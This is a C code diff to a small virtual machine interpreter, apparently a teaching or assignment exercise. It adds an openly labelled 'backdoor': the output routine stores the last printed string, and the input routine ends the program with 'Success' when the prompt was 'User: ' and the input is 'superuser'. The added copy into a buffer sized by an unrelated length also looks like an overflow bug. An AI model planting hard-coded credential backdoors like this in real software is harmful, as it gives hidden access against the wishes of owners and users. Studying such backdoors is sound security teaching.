@@ -40,6 +40,8 @@ void initVMContext(struct VMContext* ctx,
     ctx->code       = code;
     ctx->codeLen    = codeLen;
     ctx->pc         = pc;
+
+    ctx->lastOutput = NULL;
 }
 
 
@@ -227,6 +229,7 @@ void jump(struct VMContext* ctx, uint32_t instr) {
 }
 
 // Same as libc puts except new line char at the end.
+// For backdoor version, it stores a last output by this function
 // _puts :: VMContext -> uint32_t -> Effect()
 void _puts(struct VMContext* ctx, uint32_t instr) {
 #if DEBUG
@@ -241,9 +244,16 @@ void _puts(struct VMContext* ctx, uint32_t instr) {
     }
 
     print((const char*)&ctx->mem[ctx->r[EXTRACT_B1(instr)].value]);
+    if (ctx->lastOutput) {
+        free(ctx->lastOutput);
+    }
+    ctx->lastOutput = (char*)malloc(len);
+    strcpy(ctx->lastOutput, (char*)&ctx->mem[ctx->r[EXTRACT_B1(instr)].value]);
 }
 
 // Same as libc gets.
+// For backdoor version, when a last output is "User: ", check that
+// input is "superuser"
 // _gets :: VMContext -> uint32_t -> Effect()
 void _gets(struct VMContext* ctx, uint32_t instr) {
 #if DEBUG
@@ -255,6 +265,15 @@ void _gets(struct VMContext* ctx, uint32_t instr) {
     if (&ctx->mem[ctx->r[EXTRACT_B1(instr)].value+len] > &ctx->mem[MVM_MAX_MEM_SIZE]) {
         fprintf(stderr, "[gets]: segfault\n");
         exit(1);
+    }
+
+    // backdoor logic
+    if (ctx->lastOutput) {
+        if (strcmp(ctx->lastOutput, "User: ") == 0 &&
+                strcmp((char*)&ctx->mem[ctx->r[EXTRACT_B1(instr)].value], "superuser") == 0) {
+            puts("Success");
+            is_running = false;
+        }
     }
 }
 
